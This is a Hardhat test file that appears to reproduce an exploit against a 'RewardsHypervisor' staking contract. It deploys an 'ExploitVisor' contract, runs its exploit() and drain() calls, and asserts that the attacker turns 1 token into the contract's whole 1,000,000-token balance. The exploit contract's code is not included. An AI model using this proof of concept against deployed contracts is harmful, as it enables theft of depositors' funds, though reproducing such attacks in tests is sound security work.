const { expect } = require("chai");

describe("Greeter", function() {
  let deployer, attacker;

  const TOKENS = ethers.utils.parseEther('1000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [attacker, deployer] = await ethers.getSigners();

    const VISR = await ethers.getContractFactory('VISR', deployer);
    this.token = await VISR.deploy(TOKENS);
    
    const vVISR = await ethers.getContractFactory('vVISR', deployer);
    const decimals = await this.token.decimals();
    this.vVISR = await vVISR.deploy("VISR", "VISR", decimals);


    const rewardsContract = await ethers.getContractFactory('RewardsHypervisor', deployer);
    this.rewardsContract = await rewardsContract.deploy(this.token.address, this.vVISR.address);

    // only the rewards contract can mint
    await this.vVISR.transferOwnership(this.rewardsContract.address);

    // attacker starts with 1 VISR
    await this.token.transfer(attacker.address, ethers.utils.parseEther('1'));
    await this.token.transfer(this.rewardsContract.address, ethers.utils.parseEther('999999'));
    expect(await this.vVISR.balanceOf(attacker.address)).be.eq('0');
    expect(await this.token.balanceOf(attacker.address)).be.eq(ethers.utils.parseEther('1'));
  });

  it('Exploit', async function () {
    const VisorExploit = await ethers.getContractFactory('ExploitVisor');
    const exploit = await VisorExploit.deploy(this.rewardsContract.address, this.token.address, this.vVISR.address);

    await this.token.connect(attacker).transfer(exploit.address, ethers.utils.parseEther('1'));


    expect(await this.token.balanceOf(exploit.address)).be.eq(ethers.utils.parseEther('1'));
    expect(await this.vVISR.balanceOf(exploit.address)).be.eq(ethers.utils.parseEther('0'));
    expect(await this.vVISR.balanceOf(attacker.address)).be.eq(ethers.utils.parseEther('0'));
    
    await exploit.exploit();
    await exploit.drain();
    
    expect(await this.vVISR.balanceOf(attacker.address)).be.eq(ethers.utils.parseEther('0'));
    
    // magic!
    expect(await this.token.balanceOf(attacker.address)).be.eq(ethers.utils.parseEther('1000000'));
  });
});